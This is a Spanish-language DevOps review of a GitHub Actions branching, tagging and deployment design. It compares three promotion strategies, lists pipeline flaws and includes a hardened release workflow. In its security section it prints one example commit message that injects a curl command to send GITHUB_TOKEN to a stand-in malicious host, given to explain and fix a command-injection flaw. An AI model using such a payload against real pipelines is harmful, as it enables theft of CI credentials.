# Análisis Crítico: Arquitectura de Branching, Despliegue y Versionado

**Fecha:** 2026-02-14
**Analista:** Senior DevOps Architect
**Alcance:** Arquitectura propuesta por el usuario + repositorio despliegue2.0

---

## PARTE 1: ANÁLISIS CRÍTICO DE LA ARQUITECTURA PROPUESTA

### 1.1 Resumen de la Arquitectura Descrita

```
feature/* ──merge──→ develop ──────────────────→ [Entorno: Desarrollo]
                         │
                         ├── release/* ────────→ [Entorno: Pre-producción] (workflow_dispatch)
                         └── hotfix/*  ────────→ [Entorno: Pre-producción] (workflow_dispatch)
                                │
                                ├── merge ──→ main-promocion-pro ──→ [Entorno: Producción] (tag + deploy)
                                │                    │
                                │                    └── Auto-PR ──→ main-principal (código estable + tag oficial)
                                │
                                └── Rollback: redeploy de tag desde main-principal
```

### 1.2 Problemas Detectados (Severidad: CRÍTICA / ALTA / MEDIA / BAJA)

---

#### PROBLEMA 1: Protección de `main` contra código no validado en producción — REVISADO

**La preocupación del equipo es legítima:**
Si mergeamos release/* directamente a main, creamos tag y release, y luego el deploy falla:
- `main` queda contaminada con código que falló en producción
- Existe un tag "oficial" apuntando a código defectuoso
- Se publicó una GitHub Release para algo que nunca funcionó

**`main-promocion-pro` resuelve esto actuando como buffer.** Sin embargo, introduce riesgos propios que deben mitigarse.

A continuación se presentan **3 estrategias profesionales** para resolver este problema. Las 3 son válidas; la elección depende del contexto organizacional.

---

### ESTRATEGIA A: Deploy-then-Merge (Usar la rama release/* como staging) — RECOMENDADA

```
release/v2.4.0 ──→ deploy pre-producción ──→ deploy producción ──→ health check
                                                                        │
                                                         ┌──────────────┴──────────────┐
                                                         ▼                             ▼
                                                      ÉXITO                         FALLO
                                                         │                             │
                                                         ▼                             ▼
                                              Auto-merge PR a main           PR queda ABIERTA
                                              Crear tag v2.4.0 en main       main NO se toca
                                              Crear GitHub Release           Rollback a tag anterior
                                              Sync main → develop            Release branch se corrige
```

**Cómo funciona:**
1. Se abre PR de `release/v2.4.0` → `main` (pero **NO se mergea**)
2. Se despliega a producción **directamente desde la rama release** (o desde un pre-release tag `v2.4.0-rc.1`)
3. Health check pasa → el workflow **auto-mergea la PR** a main → crea tag `v2.4.0` → crea Release
4. Health check falla → la PR queda abierta → `main` intacta → rollback al tag estable anterior

**Ventajas:**
- `main` NUNCA recibe código no validado
- No necesita rama intermedia — la rama release ES el staging
- Un solo tag, creado solo tras validación exitosa
- Flujo lineal sin bifurcaciones

**Desventajas:**
- La rama release debe mantenerse viva hasta que producción valide (no se borra inmediatamente)
- Requiere que el workflow tenga permisos para auto-merge PRs

**Workflows necesarios:**
```yaml
# deploy-production.yml (modificado)
# Tras health check exitoso, añadir step:
- name: "Auto-merge PR a main"
  if: steps.health-check.outcome == 'success'
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    PR_NUMBER: ${{ github.event.inputs.pr_number }}
  run: |
    gh pr merge "${PR_NUMBER}" --merge --delete-branch

- name: "Crear tag y release"
  if: steps.health-check.outcome == 'success'
  # ... crear tag en main post-merge
```

---

### ESTRATEGIA B: Tu Enfoque con `main-promocion-pro` — VIABLE (con mejoras)

```
release/v2.4.0 ──merge──→ main-promocion-pro ──→ tag-deploy v2.4.0 ──→ deploy producción
                                                                              │
                                                               ┌──────────────┴──────────────┐
                                                               ▼                             ▼
                                                            ÉXITO                         FALLO
                                                               │                             │
                                                               ▼                             ▼
                                                    Auto-merge a main            main NO se toca
                                                    Tag oficial en main          Rollback a tag anterior
                                                    GitHub Release               Revertir en main-promocion-pro
```

**Si mantienes `main-promocion-pro`, corrige estos problemas:**

1. **UN SOLO TAG, no dos.** El tag se crea en `main-promocion-pro` para deploy. Tras validación y merge a `main`, ese mismo commit (y tag) ya está en el historial de `main`. No crees un segundo tag.

2. **Auto-merge obligatorio, no PR manual.** La PR de `main-promocion-pro` → `main` debe mergearse automáticamente cuando el health check pasa. Si depende de una persona, introduces un gap donde `main` no refleja producción.

3. **Rollback claro.** El rollback opera sobre tags globales, no sobre ramas. El tag `v2.3.1` existe en el repo independientemente de la rama.

4. **Proteger contra desincronización.** Agregar un workflow que alerte si `main-promocion-pro` está adelantada a `main` por más de N horas tras un deploy exitoso.

**Riesgos residuales que debes aceptar:**
- Complejidad operativa mayor (una rama más que mantener)
- Si el auto-merge falla (conflicto), requiere intervención manual
- Los developers deben entender que `main-promocion-pro` ≠ `main`

---

### ESTRATEGIA C: Pre-release Tags en Main

```
release/v2.4.0 ──merge──→ main ──→ tag v2.4.0-rc.1 (pre-release) ──→ deploy producción
                                                                              │
                                                               ┌──────────────┴──────────────┐
                                                               ▼                             ▼
                                                            ÉXITO                         FALLO
                                                               │                             │
                                                               ▼                             ▼
                                                    Crear tag v2.4.0 (final)     git revert del merge
                                                    Promover Release de           Crear v2.4.1 con fix
                                                    pre-release → stable          o rollback a v2.3.x
```

**Cómo funciona:**
1. Merge release/* a main
2. Se crea tag `v2.4.0-rc.1` (marcado como **pre-release** en GitHub)
3. Se despliega desde ese tag
4. Si éxito → se crea tag `v2.4.0` (final) en el mismo commit → se publica Release estable
5. Si fallo → `git revert` del merge commit en main → main vuelve al estado anterior

**Ventajas:**
- Una sola rama principal
- Pre-release tags son estándar en semver
- GitHub Releases distingue entre pre-release y stable

**Desventajas:**
- Main sí recibe el código antes de validación (pero marcado como pre-release)
- El `git revert` deja un commit de revert en el historial (ruido, pero trazable)
- Más complejo de automatizar correctamente

---

### COMPARATIVA DE LAS 3 ESTRATEGIAS

| Criterio | A: Deploy-then-Merge | B: main-promocion-pro | C: Pre-release Tags |
|----------|:-------------------:|:---------------------:|:-------------------:|
| Main protegida de código no validado | ✅ Totalmente | ✅ Totalmente | ⚠️ Parcialmente (revert) |
| Complejidad operativa | Baja | Media-Alta | Media |
| Número de ramas permanentes | 2 (develop, main) | 3 (develop, main-promocion-pro, main) | 2 (develop, main) |
| Número de tags por release | 1 | 1 (si se corrige) o 2 (actual) | 2 (rc + final) |
| Historial de main limpio | ✅ | ✅ | ⚠️ (reverts visibles) |
| Facilidad de rollback | ✅ Tag anterior | ✅ Tag anterior | ✅ Tag anterior |
| Estándar en la industria | ✅ (GitHub Flow) | ⚠️ (Custom) | ✅ (Semver pre-releases) |
| Requiere auto-merge de PR | Sí | Sí | No |
| Enterprise / auditoría | ✅ | ✅ | ✅ |

---

#### PROBLEMA 2: Doble sistema de tags — Severidad: CRÍTICA

**Descripción:**
El flujo descrito crea:
1. Un tag de despliegue en `main-promocion-pro` (para desplegar a producción)
2. Un tag y release "oficial" en `main-principal` (tras mergear la PR automática)

Esto viola el principio de **Single Source of Truth** para versionado:
- ¿Qué tag identifica la versión en producción? ¿El de promoción o el oficial?
- Si alguien inspecciona los tags de `main-principal`, verá tags que fueron creados DESPUÉS del deploy real, no en el momento del deploy.
- Los timestamps de los tags no reflejan cuándo se deployó realmente.
- Los auditores verán dos tags para el mismo código con diferentes timestamps.

**Recomendación:**
Un solo tag, creado en una sola rama, en un solo momento. El tag es inmutable y representa exactamente el código que se deployó.

---

#### PROBLEMA 3: El rollback depende de `main-principal`, pero el deploy ocurre desde `main-promocion-pro` — Severidad: ALTA

**Descripción:**
Si el deploy se hace desde `main-promocion-pro` con un tag, pero el rollback se hace "redeployando un tag estable desde `main-principal`", hay un gap temporal. Los tags oficiales solo existen en `main-principal` DESPUÉS de que la PR se apruebe. Esto significa:

- **Escenario de riesgo:** Deploy falla → se necesita rollback → el tag "oficial" anterior está en `main-principal` → pero el tag de este deploy está en `main-promocion-pro` → ¿Desde qué rama se hace rollback?
- **Si `main-principal` está desactualizada** (la PR no se mergeó aún), los tags disponibles para rollback no incluyen la versión anterior real.

**Recomendación:**
El rollback debe operar sobre tags globales del repositorio, no atados a una rama específica. Un tag de Git es un puntero a un commit, no pertenece a una rama. El workflow de rollback solo necesita el tag.

---

#### PROBLEMA 4: Dependencia de acción humana para consolidar el estado estable — Severidad: ALTA

**Descripción:**
> "Se debe crear automáticamente una Pull Request desde main-promocion-pro hacia main-principal. El usuario únicamente debe aprobar y mergear esa Pull Request."

Este paso manual crea un **bottleneck operativo**:
- Si nadie mergea la PR, `main-principal` queda desactualizada indefinidamente.
- Si se acumulan múltiples PRs sin mergear, los conflictos se multiplican.
- En un incidente donde se necesita hacer rollback rápidamente, ¿qué pasa si `main-principal` no refleja el estado actual de producción?

**Recomendación:**
Si la validación en producción es exitosa (health check), el merge a main debería ser automático. La aprobación humana ya ocurrió en el environment approval ANTES del deploy.

---

#### PROBLEMA 5: Falta de workflow para `develop` y pre-producción — Severidad: MEDIA

**Descripción:**
La arquitectura describe tres entornos (desarrollo, pre-producción, producción), pero:
- No hay workflow definido para deploy a desarrollo desde `develop`.
- El deploy a pre-producción desde release/hotfix es "manual mediante workflow_dispatch", pero no hay workflow para ello.
- Solo existen workflows para producción (despliegue2.0).

Esto deja 2/3 del pipeline sin automatización.

**Recomendación:**
Crear workflows para:
1. **CI/CD a desarrollo:** Trigger en push a `develop`, deploy automático.
2. **CD a pre-producción:** Trigger en push a `release/*` o `hotfix/*`, deploy con smoke tests.

---

#### PROBLEMA 6: No hay protección contra merge directo a `main-principal` o `main-promocion-pro` — Severidad: MEDIA

**Descripción:**
La arquitectura dice "nunca se modifica directamente", pero no hay mecanismo técnico que lo impida más allá de branch protection rules (que deben configurarse externamente).

**Recomendación:**
Documentar explícitamente las branch protection rules requeridas como parte del setup:
- `main-principal`: Require PR, require approvals, no direct push, no force push
- `main-promocion-pro`: Require PR (solo desde release/hotfix), no direct push
- `develop`: Require PR (desde feature/*)

---

#### PROBLEMA 7: No hay sincronización inversa (main → develop) — Severidad: MEDIA

**Descripción:**
Después de un deploy exitoso y merge a `main-principal`, no hay mecanismo para que esos cambios (y especialmente los hotfixes) regresen a `develop`. Esto causa:
- Hotfixes que se aplican en producción pero no están en desarrollo.
- Divergencia creciente entre `develop` y producción.
- Conflictos al crear la siguiente release.

**Recomendación:**
Automatizar sync de `main` → `develop` después de cada merge exitoso. El workflow de `actions-create-release` ya tiene esta funcionalidad (`sync_to_develop: true`).

---

#### PROBLEMA 8: Ausencia de CHANGELOG automatizado — Severidad: BAJA

**Descripción:**
El flujo descrito no menciona generación de CHANGELOG. Para trazabilidad enterprise, un CHANGELOG auditable es esencial.

**Recomendación:**
Integrar generación automática de CHANGELOG como parte del workflow de release (el repo ya tiene scripts Python para esto en `github-actions-release/scripts/`).

---

### 1.3 Evaluación: ¿Es `main-promocion-pro` correcto o innecesario?

**Veredicto: INNECESARIO en la mayoría de escenarios.**

La rama `main-promocion-pro` intenta resolver el problema de "no quiero deployar directamente desde main porque main debe ser estable". Pero este problema se resuelve mejor con:

1. **GitHub Environments con approval gates** — El deploy a producción requiere aprobación humana antes de ejecutarse. Esto es exactamente lo que ya tiene `despliegue2.0`.
2. **Tags inmutables** — El tag apunta a un commit exacto. Si el deploy falla, el tag sigue ahí y se puede hacer rollback al anterior.
3. **Branch protection rules** — Main solo recibe merges desde release/hotfix vía PR aprobada.

El único caso donde `main-promocion-pro` tiene sentido es si la organización **requiere regulatoriamente** un paso intermedio documentado entre "código listo para producción" y "código validado en producción". Esto es raro y se puede resolver con labels en releases (draft → published) o con estados en la GitHub Release.

---

## PARTE 2: ANÁLISIS DEL REPOSITORIO `despliegue2.0`

### 2.1 Lo que está BIEN (y merece mantenerse)

| Aspecto | Evaluación |
|---------|-----------|
| **Separación en 4 workflows** | Excelente. Single Responsibility, cada workflow tiene una función clara. |
| **Comunicación via JSON** | Buena decisión. Estado explícito, versionable, auditable. |
| **Runners separados** (github-hosted vs self-hosted) | Óptimo. Minimiza uso de self-hosted para solo lo necesario. |
| **Health check post-deploy** | Esencial. 10×15s es razonable. |
| **Triple protección en rollback** | Sólido. Confirmación textual + validaciones + environment approval. |
| **Tags anotados** | Correcto para producción. Metadata (quién, cuándo, mensaje). |
| **Manejo de race condition** (tag validation en schedule) | Bien pensado. Reintento silencioso en 5 min. |
| **Cleanup de workspace** en self-hosted | Crítico y está presente. |
| **Documentación detallada** | Profesional. README exhaustivo con FAQ y riesgos. |

### 2.2 Problemas Detectados en `despliegue2.0`

---

#### PROBLEMA D1: Inyección de variables en shell desde commit messages — Severidad: CRÍTICA (Seguridad)

**Archivos afectados:** `1-release.yml` líneas 85-86, 131, 159

```yaml
COMMIT_MSG="${{ github.event.head_commit.message }}"
```

**Riesgo:** Un commit message malicioso puede contener caracteres que rompan el shell o ejecuten comandos arbitrarios. Ejemplo:
```
[release] $(curl https://malicious.com/exfiltrate?token=$GITHUB_TOKEN)
```

Esto es un **Command Injection** vía commit message.

**Recomendación:**
```yaml
# En lugar de interpolación directa en shell:
COMMIT_MSG="${{ github.event.head_commit.message }}"  # ❌ PELIGROSO

# Usar variable de entorno:
env:
  COMMIT_MSG: ${{ github.event.head_commit.message }}
# Y referenciar como:
  echo "${COMMIT_MSG}"  # ✅ SEGURO (la variable no se expande en el contexto de GitHub)
```

O mejor aún, usar `actions/github-script` para el parsing del mensaje.

---

#### PROBLEMA D2: El cron scheduler escribe commits a `main` — Severidad: ALTA

**Archivo:** `2-deploy-schedule.yml` líneas 219-223 y `1-release.yml` líneas 200-204

Los workflows hacen `git push origin main` para actualizar archivos JSON de estado. Esto:
- **Puede disparar otros workflows** que tienen trigger `on: push: branches: [main]` (incluyendo `release.yml` de nuevo). Se mitiga parcialmente con `[no-release]` en el commit message, pero `release.yml` solo chequea `[release]` o `[hotfix]`, así que no se re-dispara. Sin embargo, cualquier OTRO workflow con trigger en main sí se dispara.
- **Contamina el historial de main** con commits automatizados de estado (`chore: schedule...`, `chore: mark deploy...`).
- **Puede causar conflictos de push** si dos schedules se procesan simultáneamente.

**Recomendación:**
Usar **GitHub API artifacts** o **repository variables/deployments API** en lugar de commits al repo para comunicación entre workflows. Alternativa: usar una rama dedicada para estado (`deploy-state`) que nunca se merge a main.

---

#### PROBLEMA D3: No existe workflow para `develop` ni pre-producción — Severidad: ALTA

El sistema solo cubre producción. Faltan:
- Deploy automático a desarrollo (push a develop)
- Deploy a pre-producción (desde release/hotfix)
- Tests de integración / smoke tests antes de producción

---

#### PROBLEMA D4: El DEPLOY_SCHEDULED en el commit message es frágil — Severidad: MEDIA

**Archivo:** `1-release.yml` líneas 127-149

Depender de texto en el commit message para datos estructurados es propenso a errores:
- El developer puede olvidar incluirlo.
- Formato incorrecto (sin timezone, espacio extra, etc.) rompe el workflow.
- No hay forma de modificar la fecha después del merge sin hacer otro commit.

**Recomendación:**
Usar **workflow_dispatch inputs** para la fecha de deploy en lugar de parsing del commit message. O usar **GitHub deployment environments con wait timer**.

---

#### PROBLEMA D5: No hay CHANGELOG automático — Severidad: BAJA

El sistema crea GitHub Releases pero no mantiene un CHANGELOG.md. Las scripts ya existen en el repo (`crear_changelog.py`) pero no están integradas en despliegue2.0.

---

#### PROBLEMA D6: Los inputs de workflow_dispatch son vulnerables a manipulación — Severidad: MEDIA

**Archivo:** `3-deploy-production.yml` líneas 299-303 y `4-rollback-manual.yml` líneas 458-464

```javascript
const tag = '${{ github.event.inputs.tag }}';
```

Si el input contiene comillas simples, rompe el JavaScript. Debería usarse template literals o sanitización.

**Recomendación:**
```javascript
const tag = context.payload.inputs.tag;  // ✅ Acceso seguro via context
```

---

## PARTE 3: ARQUITECTURA MEJORADA PROPUESTA

### 3.1 Modelo de Branching Simplificado

```
feature/* ──PR──→ develop ─────────────────→ [Auto-deploy a Desarrollo]
                      │
                      ├── release/* ─PR──→ [Auto-deploy a Pre-producción]
                      └── hotfix/*  ─PR──→ [Auto-deploy a Pre-producción]
                              │
                              └── PR a main ──→ [Tag semántico automático]
                                                      │
                                                      └── Deploy a Producción (environment gate)
                                                              │
                                                              └── Post-deploy: sync main → develop
```

**Cambios clave:**
- **Eliminar `main-promocion-pro`** — `main` es la única rama de producción.
- **Eliminar `main-principal`** — Fusionada en `main`.
- **Un solo tag** — Creado en `main` tras merge de release/hotfix.
- **Sync automático** — `main` → `develop` después de cada release.

### 3.2 Modelo de 6 Workflows

| # | Workflow | Trigger | Entorno | Responsabilidad |
|---|---------|---------|---------|-----------------|
| 1 | `ci.yml` | PR a cualquier rama | — | Lint, tests, build check |
| 2 | `deploy-dev.yml` | Push a `develop` | desarrollo | Deploy automático a desarrollo |
| 3 | `deploy-pre.yml` | Push a `release/*`, `hotfix/*` | pre-producción | Deploy + smoke tests a pre-producción |
| 4 | `release.yml` | PR merged a `main` | — | Crear tag, release, CHANGELOG |
| 5 | `deploy-production.yml` | `workflow_dispatch` | producción | Deploy a producción con health check |
| 6 | `rollback-manual.yml` | `workflow_dispatch` | producción | Rollback manual con triple protección |

### 3.3 Flujo Completo Profesional

```
1. Developer crea feature/ABC-123
2. Abre PR a develop → CI corre tests
3. Merge a develop → auto-deploy a desarrollo
4. Developer crea release/v2.4.0 desde develop
5. Push a release/v2.4.0 → auto-deploy a pre-producción + smoke tests
6. QA valida en pre-producción
7. Abre PR de release/v2.4.0 a main
8. PR aprobada y merged → release.yml crea tag v2.4.0 + GitHub Release + CHANGELOG
9. Ops dispara deploy-production.yml con tag v2.4.0 → environment approval → deploy → health check
10. Post-deploy exitoso → sync main → develop automático
11. Si falla → rollback-manual.yml o redeploy de tag anterior
```

---

## PARTE 4: PLAN DE ACCIÓN

### Fase 1: Correcciones de Seguridad (Prioridad: INMEDIATA)

| # | Tarea | Archivo | Esfuerzo |
|---|-------|---------|----------|
| 1.1 | Corregir command injection en commit message parsing | `1-release.yml` | 30 min |
| 1.2 | Corregir JavaScript injection en inputs de workflow_dispatch | `3-deploy-production.yml`, `4-rollback-manual.yml` | 30 min |
| 1.3 | Sanitizar todas las interpolaciones `${{ }}` en contexto shell | Todos los workflows | 1 hora |

### Fase 2: Refactoring de Branching (Prioridad: ALTA)

| # | Tarea | Esfuerzo |
|---|-------|----------|
| 2.1 | Consolidar `main-promocion-pro` y `main-principal` en una sola rama `main` | 2 horas |
| 2.2 | Configurar branch protection rules para `main`, `develop`, `release/*` | 1 hora |
| 2.3 | Eliminar doble tagging — un solo tag en `main` | 1 hora |
| 2.4 | Documentar el nuevo flujo de branching | 1 hora |

### Fase 3: Workflows Faltantes (Prioridad: ALTA)

| # | Tarea | Esfuerzo |
|---|-------|----------|
| 3.1 | Crear `ci.yml` — linting, tests, build en PRs | 2 horas |
| 3.2 | Crear `deploy-dev.yml` — deploy automático a desarrollo | 2 horas |
| 3.3 | Crear `deploy-pre.yml` — deploy a pre-producción con smoke tests | 3 horas |
| 3.4 | Agregar sync `main` → `develop` post-release | 1 hora |

### Fase 4: Mejoras en `despliegue2.0` (Prioridad: MEDIA)

| # | Tarea | Archivo | Esfuerzo |
|---|-------|---------|----------|
| 4.1 | Eliminar commits de estado a `main` — usar deployments API o artifacts | `1-release.yml`, `2-deploy-schedule.yml` | 4 horas |
| 4.2 | Mover DEPLOY_SCHEDULED a workflow_dispatch input o PR labels | `1-release.yml` | 2 horas |
| 4.3 | Integrar CHANGELOG automático | `release.yml` + scripts existentes | 2 horas |
| 4.4 | Agregar concurrency groups para evitar deploys simultáneos | `3-deploy-production.yml` | 30 min |
| 4.5 | Agregar notificación a Slack/Teams además de GitHub Issues | `3-deploy-production.yml`, `4-rollback-manual.yml` | 2 horas |

### Fase 5: Endurecimiento Enterprise (Prioridad: MEDIA-BAJA)

| # | Tarea | Esfuerzo |
|---|-------|----------|
| 5.1 | Agregar audit log persistente (quién deployó qué, cuándo, resultado) | 3 horas |
| 5.2 | Configurar CODEOWNERS para workflows | 30 min |
| 5.3 | Agregar firma de commits (GPG) en commits del bot | 1 hora |
| 5.4 | Agregar dry-run mode para producción | 2 horas |
| 5.5 | Implementar canary deployment o blue/green como opción | 8 horas |

---

## PARTE 5: COMPARATIVA FINAL

### Arquitectura Actual vs Propuesta

| Aspecto | Actual | Propuesta |
|---------|--------|-----------|
| Ramas principales | 4 (develop, release/*, main-promocion-pro, main-principal) | 3 (develop, release/*, main) |
| Tags | 2 por release (deploy + oficial) | 1 por release (en main) |
| Fuente de verdad producción | Ambigua (¿main-promocion-pro o main-principal?) | Clara: `main` + tags |
| Workflows de producción | 4 (despliegue2.0) | 4 (mismos, mejorados) |
| Workflows totales | 4 | 6 (+ CI, dev, pre) |
| Entornos cubiertos | 1/3 (solo producción) | 3/3 |
| Sync main → develop | Manual | Automático |
| CHANGELOG | No | Automático |
| Seguridad (injection) | Vulnerable | Corregido |
| Rollback | Tag desde main-principal | Tag global (cualquier rama) |
| Aprobación humana para deploy | Environment gate | Environment gate (sin cambios) |
| Complejidad operativa | Alta (4 ramas, 2 tags, PR manual) | Media (3 ramas, 1 tag, flujo lineal) |

### ¿Es Enterprise-Ready la Arquitectura Actual?

**No completamente.** Los principales gaps son:
1. La complejidad innecesaria de `main-promocion-pro` introduce riesgo operativo.
2. Las vulnerabilidades de inyección de comandos son inaceptables para enterprise.
3. La ausencia de CI y cobertura de entornos dev/pre es un gap significativo.
4. La falta de CHANGELOG y audit log completo afecta compliance.

**Con las mejoras propuestas**, el sistema sería enterprise-ready para organizaciones de tamaño medio. Para organizaciones grandes (>100 devs), se recomienda adicionalmente:
- ArgoCD o Flux para GitOps
- Canary deployments
- Feature flags
- Observabilidad (metrics + tracing) integrada en el pipeline

---

## APÉNDICE: Workflow de Ejemplo — `release.yml` Mejorado (Seguro)

```yaml
name: "Release - Create Semantic Tag"

on:
  pull_request:
    types: [closed]
    branches: [main]

permissions:
  contents: write

jobs:
  create-release:
    if: >
      github.event.pull_request.merged == true &&
      (startsWith(github.event.pull_request.head.ref, 'release/') ||
       startsWith(github.event.pull_request.head.ref, 'hotfix/'))
    runs-on: ubuntu-latest

    steps:
      - name: "Checkout"
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: "Extract version from branch name"
        id: version
        env:
          BRANCH: ${{ github.event.pull_request.head.ref }}
        run: |
          # Extraer versión del nombre de rama (release/v1.2.3 → v1.2.3)
          VERSION=$(echo "${BRANCH}" | grep -oP 'v\d+\.\d+\.\d+' || echo "")
          if [ -z "${VERSION}" ]; then
            echo "ERROR: No version found in branch name: ${BRANCH}"
            exit 1
          fi
          echo "version=${VERSION}" >> $GITHUB_OUTPUT

      - name: "Verify tag does not exist"
        env:
          VERSION: ${{ steps.version.outputs.version }}
        run: |
          if git rev-parse --verify "refs/tags/${VERSION}" > /dev/null 2>&1; then
            echo "ERROR: Tag ${VERSION} already exists"
            exit 1
          fi

      - name: "Create GitHub Release"
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.version.outputs.version }}
          name: "Release ${{ steps.version.outputs.version }}"
          body: ${{ github.event.pull_request.body }}
          generate_release_notes: true

      - name: "Sync main → develop"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git config user.name "GitHub Actions Bot"
          git fetch origin develop
          git checkout develop
          git merge origin/main --no-edit || {
            echo "CONFLICT: Creating PR for manual resolution"
            gh pr create \
              --base develop \
              --head main \
              --title "sync: main → develop after ${{ steps.version.outputs.version }}" \
              --body "Auto-sync after release. Resolve conflicts manually."
            exit 0
          }
          git push origin develop
```

**Diferencias clave vs el actual:**
1. Trigger en `pull_request.closed` (no push) — más seguro y predecible.
2. Versión extraída del nombre de rama, no del commit message — inmune a inyección.
3. Variables pasadas via `env:` no via interpolación directa — seguro.
4. Sync automático main → develop incluido.
5. Sin commits de estado al repo.
6. Sin parsing de DEPLOY_SCHEDULED del commit message.

---

*Documento generado como análisis técnico. Las recomendaciones deben validarse con el equipo y adaptarse al contexto organizacional específico.*
